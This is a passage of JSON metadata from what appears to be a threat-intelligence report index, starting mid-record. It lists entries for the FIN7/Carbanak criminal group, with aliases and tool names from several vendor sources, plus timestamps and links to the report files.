            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "bb8702c5-52ac-4359-8409-998a7cc3eeaf",
            "created_at": "2023-01-06T13:46:38.405479Z",
            "updated_at": "2025-03-27T02:00:02.82533Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "JokerStash",
                "ATK32",
                "G0046",
                "Coreid",
                "Carbanak",
                "Sangria Tempest",
                "CARBON SPIDER",
                "GOLD NIAGARA",
                "G0008",
                "ELBRUS",
                "Carbon Spider"
            ],
            "source_name": "MISPGALAXY:FIN7",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ed3810b7-141a-4ed0-8a01-6a972b80458d",
            "created_at": "2022-10-25T16:07:23.443259Z",
            "updated_at": "2025-03-27T02:02:09.801771Z",
            "deleted_at": null,
            "main_name": "Carbanak",
            "aliases": [
                "Anunak",
                "Carbanak",
                "Carbon Spider",
                "ELBRUS",
                "Gold Waterfall",
                "Sangria Tempest"
            ],
            "source_name": "ETDA:Carbanak",
            "tools": [
                "AVE_MARIA",
                "Agentemis",
                "AmmyyRAT",
                "Antak",
                "Anunak",
                "Ave Maria",
                "AveMariaRAT",
                "BABYMETAL",
                "BIRDDOG",
                "Backdoor Batel",
                "Batel",
                "Bateleur",
                "BlackMatter",
                "Boostwrite",
                "Cain & Abel",
                "Carbanak",
                "Cl0p",
                "Cobalt Strike",
                "CobaltStrike",
                "DNSMessenger",
                "DNSRat",
                "DNSbot",
                "DRIFTPIN",
                "DarkSide",
                "FOXGRABBER",
                "FlawedAmmyy",
                "HALFBAKED",
                "JS Flash",
                "KLRD",
                "MBR Eraser",
                "Mimikatz",
                "Nadrac",
                "Odinaff",
                "POWERPIPE",
                "POWERSOURCE",
                "PsExec",
                "SQLRAT",
                "Sekur",
                "Sekur RAT",
                "SocksBot",
                "SoftPerfect Network Scanner",
                "Spy.Agent.ORM",
                "TEXTMATE",
                "TeamViewer",
                "TiniMet",
                "TinyMet",
                "Toshliph",
                "VB Flash",
                "WARPRISM",
                "avemaria",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716497,
    "ts_updated_at": 1743041817,
    "ts_creation_date": 1484730370,
    "ts_modification_date": 1484730379,
    "files": {
        "pdf": "https://archive.orkl.eu/d24be75959478224c4010d195a3db784a9dc56ca.pdf",
        "text": "https://archive.orkl.eu/d24be75959478224c4010d195a3db784a9dc56ca.txt",
        "img": "https://archive.orkl.eu/d24be75959478224c4010d195a3db784a9dc56ca.jpg"
    }
}